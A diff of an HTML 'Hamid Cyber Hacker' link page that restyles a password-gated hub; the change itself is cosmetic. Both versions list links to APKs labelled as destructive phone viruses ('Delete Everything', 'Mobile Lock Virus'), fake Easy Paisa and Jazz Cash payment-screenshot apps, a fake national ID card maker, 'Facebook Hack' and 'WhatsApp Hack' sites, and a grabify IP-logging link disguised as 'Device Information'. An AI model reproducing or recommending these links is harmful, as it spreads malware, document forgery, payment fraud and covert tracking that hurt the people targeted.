@@ -1,89 +1,126 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Hamid Cyber Links</title>
   <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap');
+
     body {
-      background-color: #000;
+      background: linear-gradient(to right, #000000, #1a1a1a);
       color: white;
-      font-family: Arial, sans-serif;
+      font-family: 'Poppins', sans-serif;
       text-align: center;
       padding: 20px;
     }
+
     .title {
-      font-size: 24px;
+      font-size: 26px;
       margin: 20px 0;
+      font-weight: 600;
+      color: #ff0033;
+      text-shadow: 0 0 10px red;
     }
+
+    .center-image {
+      width: 140px;
+      height: 140px;
+      object-fit: cover;
+      border-radius: 50%;
+      border: 4px solid #ff0033;
+      box-shadow: 0 0 20px #ff0033;
+      margin-bottom: 20px;
+    }
+
+    .login-box {
+      background: rgba(255, 255, 255, 0.05);
+      backdrop-filter: blur(10px);
+      padding: 30px 25px;
+      border-radius: 15px;
+      box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
+      width: 90%;
+      max-width: 400px;
+      margin: 0 auto 30px auto;
+      border: 1px solid #ff0033;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin: 12px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    input {
+      background: #1a1a1a;
+      color: #fff;
+      box-shadow: inset 0 0 5px #ff0033;
+    }
+
+    button {
+      background: linear-gradient(90deg, #ff0033, #990000);
+      color: white;
+      font-weight: bold;
+      transition: 0.3s;
+      box-shadow: 0 0 12px #ff0033;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: linear-gradient(90deg, #990000, #ff0033);
+      transform: scale(1.03);
+    }
+
+    #createdBy {
+      margin: 15px 0;
+      font-size: 18px;
+      font-weight: bold;
+      min-height: 24px;
+      text-shadow: 0 0 5px red;
+    }
+
     .link-button {
       display: block;
       width: 80%;
       margin: 10px auto;
       padding: 15px;
       font-size: 18px;
-      background: linear-gradient(90deg, red, darkred);
+      background: linear-gradient(90deg, #cc0000, #660000);
       color: white;
       border: none;
-      border-radius: 10px;
+      border-radius: 12px;
       text-decoration: none;
-      box-shadow: 0 0 10px red;
+      box-shadow: 0 0 12px #ff0033;
+      transition: 0.3s;
     }
+
     .link-button:hover {
-      background: linear-gradient(90deg, darkred, red);
+      background: linear-gradient(90deg, #660000, #cc0000);
+      transform: scale(1.02);
     }
-    .center-image {
-      width: 150px;
-      height: 150px;
-      object-fit: cover;
-      border-radius: 50%;
-      margin-bottom: 20px;
-      border: 3px solid red;
-      box-shadow: 0 0 10px red;
-    }
-    .login-box {
-      background: #111;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px red;
-      width: 90%;
-      max-width: 400px;
-      margin: 0 auto 30px auto;
-    }
-    input, button {
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-    }
-    input {
-      background: #222;
-      color: #fff;
-      box-shadow: inset 0 0 5px red;
-    }
-    button {
-      background: linear-gradient(90deg, red, darkred);
-      color: #fff;
-      cursor: pointer;
-    }
-    #createdBy {
-      margin: 15px 0;
-      font-size: 18px;
-      font-weight: bold;
-      min-height: 24px;
-    }
+
     .contact-button {
-      margin-top: 10px;
-      background: green;
+      margin-top: 15px;
+      background: #00cc66;
       color: white;
-      padding: 10px;
+      padding: 12px;
       border: none;
-      border-radius: 5px;
+      border-radius: 6px;
       font-size: 16px;
       cursor: pointer;
       text-decoration: none;
       display: inline-block;
+      font-weight: 500;
+      box-shadow: 0 0 10px #00cc66;
+      transition: 0.3s;
+    }
+
+    .contact-button:hover {
+      background: #00994d;
     }
   </style>
 </head>
@@ -94,41 +131,45 @@
     <input type="password" id="password" placeholder="Enter Password" />
     <button onclick="checkLogin()">Login</button>
     <a class="contact-button" href="https://wa.me/923453538759?text=Hi+Bro+I+need+login" target="_blank">Contact with Owner</a>
-  </div>  <div id="mainContent" style="display:none;">
-    <img src="https://i.ibb.co/TMFxrLPv/3214.jpg" alt="Hamid Logo" class="center-image" />
-    <div class="title">Hamid Cyber Hacker💻</div><a class="link-button" href="https://www.imei.info/">IMEI Check</a>
-<a class="link-button" href="https://cnic.sims.pk/">SIM Registration Check</a>
-<a class="link-button" href="https://chat.openai.com">ChatGPT</a>
-<a class="link-button" href="https://excise.gos.pk/">Punjab Vehicle Check</a>
-<a class="link-button" href="https://vehicleverification.pk/">Sindh Vehicle Check</a>
-<a class="link-button" href="https://www.kpexcise.gov.pk/">KPK Vehicle Check</a>
-<a class="link-button" href="https://nims.nadra.gov.pk/nims/">COVID-19 Check</a>
-<a class="link-button" href="https://idcards.pw/">Fake CNIC Maker</a>
-<a class="link-button" href="https://zefoy.com/">TikTok Views Trick</a>
-<a class="link-button" href="https://pakpoll.com/cnic/">CNIC Info</a>
-<a class="link-button" href="https://dls.gos.pk/">DLIMS Sindh Check</a>
-<a class="link-button" href="https://dlims.punjab.gov.pk/verify/">DLIMS Punjab Verification</a>
-<a class="link-button" href="https://dlimskpk-gov.com/">DLIMS KPK Verification</a>
-<a class="link-button" href="https://checkbill.pk/">All Bill Check Online</a>
-<a class="link-button" href="https://simdetails.com">SIM Ownership</a>
-<a class="link-button" href="https://grabify.link/track/HY9HN8">Device Information</a>
-<a class="link-button" href="https://account.st/facebook/">Facebook Hack</a>
-<a class="link-button" href="https://account.st/whatsapp/">WhatsApp Hack</a>
-<a class="link-button" href="https://account.st/track-mobile/">Trace Phone</a>
-<a class="link-button" href="https://www.simdetail.com/">SIM Details 2</a>
-<a class="link-button" href="https://temp-mail.org/en/">Temp Mail</a>
-<a class="link-button" href="https://quran.com/">Quran Pak</a>
-<a class="link-button" href="https://www.mediafire.com/file/iyngfbomye8axh3/Android+reset+.apk/file">Android Virus APK</a>
-<a class="link-button" href="https://www.mediafire.com/file/4qrvq9r98lq8xkc/Delete+everything+virus.apk/file">Delete Everything APK</a>
-<a class="link-button" href="https://www.mediafire.com/file/oiinsrbswsria5d/Mobile+lock+virus.apk/file">Mobile Lock Virus APK</a>
-<a class="link-button" href="https://www.mediafire.com/file/22y2z429nnttib5/EASY+PAYSA+🔥.apk/file">Easy Paisa Fake Screenshot APK</a>
-<a class="link-button" href="https://www.mediafire.com/file/z2y7xo76zbg1716/JAZCASH+🔥.apk/">Jazz Cash Fake Screenshot APK</a>
-<a class="link-button" href="https://drive.google.com/file/d/1XUfR8LP8MPkBp5Kr1dOaHMpIKnryzEat/view?usp=drivesdk">TikTok 100% ForYou Trick</a>
-<a class="link-button" href="https://drive.google.com/file/d/1uhR2OaHDt5Gf9NjZYnn2sPZY7O4jQph7/view?usp=drivesdk">TikTok Viral Method</a>
-<a class="link-button" href="https://drive.google.com/drive/folders/1FUhjQqgUlhnL48E5hCjhwjKsEn3XMT2T">YouTube Short Video Viral Method</a>
-<a class="link-button" href="https://drive.google.com/drive/folders/1tW47PkqEeioNde3pup8FhDJssCK3meiv">YouTube Long Video Viral Method</a>
+  </div>
 
-  </div>  <script>
+  <div id="mainContent" style="display:none;">
+    <img src="https://i.ibb.co/TMFxrLPv/3214.jpg" alt="Hamid Logo" class="center-image" />
+    <div class="title">Hamid Cyber Hacker💻</div>
+    <a class="link-button" href="https://www.imei.info/">IMEI Check</a>
+    <a class="link-button" href="https://cnic.sims.pk/">SIM Registration Check</a>
+    <a class="link-button" href="https://chat.openai.com">ChatGPT</a>
+    <a class="link-button" href="https://excise.gos.pk/">Punjab Vehicle Check</a>
+    <a class="link-button" href="https://vehicleverification.pk/">Sindh Vehicle Check</a>
+    <a class="link-button" href="https://www.kpexcise.gov.pk/">KPK Vehicle Check</a>
+    <a class="link-button" href="https://nims.nadra.gov.pk/nims/">COVID-19 Check</a>
+    <a class="link-button" href="https://idcards.pw/">Fake CNIC Maker</a>
+    <a class="link-button" href="https://zefoy.com/">TikTok Views Trick</a>
+    <a class="link-button" href="https://pakpoll.com/cnic/">CNIC Info</a>
+    <a class="link-button" href="https://dls.gos.pk/">DLIMS Sindh Check</a>
+    <a class="link-button" href="https://dlims.punjab.gov.pk/verify/">DLIMS Punjab Verification</a>
+    <a class="link-button" href="https://dlimskpk-gov.com/">DLIMS KPK Verification</a>
+    <a class="link-button" href="https://checkbill.pk/">All Bill Check Online</a>
+    <a class="link-button" href="https://simdetails.com">SIM Ownership</a>
+    <a class="link-button" href="https://grabify.link/track/HY9HN8">Device Information</a>
+    <a class="link-button" href="https://account.st/facebook/">Facebook Hack</a>
+    <a class="link-button" href="https://account.st/whatsapp/">WhatsApp Hack</a>
+    <a class="link-button" href="https://account.st/track-mobile/">Trace Phone</a>
+    <a class="link-button" href="https://www.simdetail.com/">SIM Details 2</a>
+    <a class="link-button" href="https://temp-mail.org/en/">Temp Mail</a>
+    <a class="link-button" href="https://quran.com/">Quran Pak</a>
+    <a class="link-button" href="https://www.mediafire.com/file/iyngfbomye8axh3/Android+reset+.apk/file">Android Virus APK</a>
+    <a class="link-button" href="https://www.mediafire.com/file/4qrvq9r98lq8xkc/Delete+everything+virus.apk/file">Delete Everything APK</a>
+    <a class="link-button" href="https://www.mediafire.com/file/oiinsrbswsria5d/Mobile+lock+virus.apk/file">Mobile Lock Virus APK</a>
+    <a class="link-button" href="https://www.mediafire.com/file/22y2z429nnttib5/EASY+PAYSA+🔥.apk/file">Easy Paisa Fake Screenshot APK</a>
+    <a class="link-button" href="https://www.mediafire.com/file/z2y7xo76zbg1716/JAZCASH+🔥.apk/">Jazz Cash Fake Screenshot APK</a>
+    <a class="link-button" href="https://drive.google.com/file/d/1XUfR8LP8MPkBp5Kr1dOaHMpIKnryzEat/view?usp=drivesdk">TikTok 100% ForYou Trick</a>
+    <a class="link-button" href="https://drive.google.com/file/d/1uhR2OaHDt5Gf9NjZYnn2sPZY7O4jQph7/view?usp=drivesdk">TikTok Viral Method</a>
+    <a class="link-button" href="https://drive.google.com/drive/folders/1FUhjQqgUlhnL48E5hCjhwjKsEn3XMT2T">YouTube Short Video Viral Method</a>
+    <a class="link-button" href="https://drive.google.com/drive/folders/1tW47PkqEeioNde3pup8FhDJssCK3meiv">YouTube Long Video Viral Method</a>
+  </div>
+
+  <script>
     function checkLogin() {
       const username = document.getElementById("username").value.trim();
       const password = document.getElementById("password").value.trim();
@@ -160,5 +201,6 @@
       }, 100);
     }
     typeWriter();
-  </script></body>
+  </script>
+</body>
 </html>
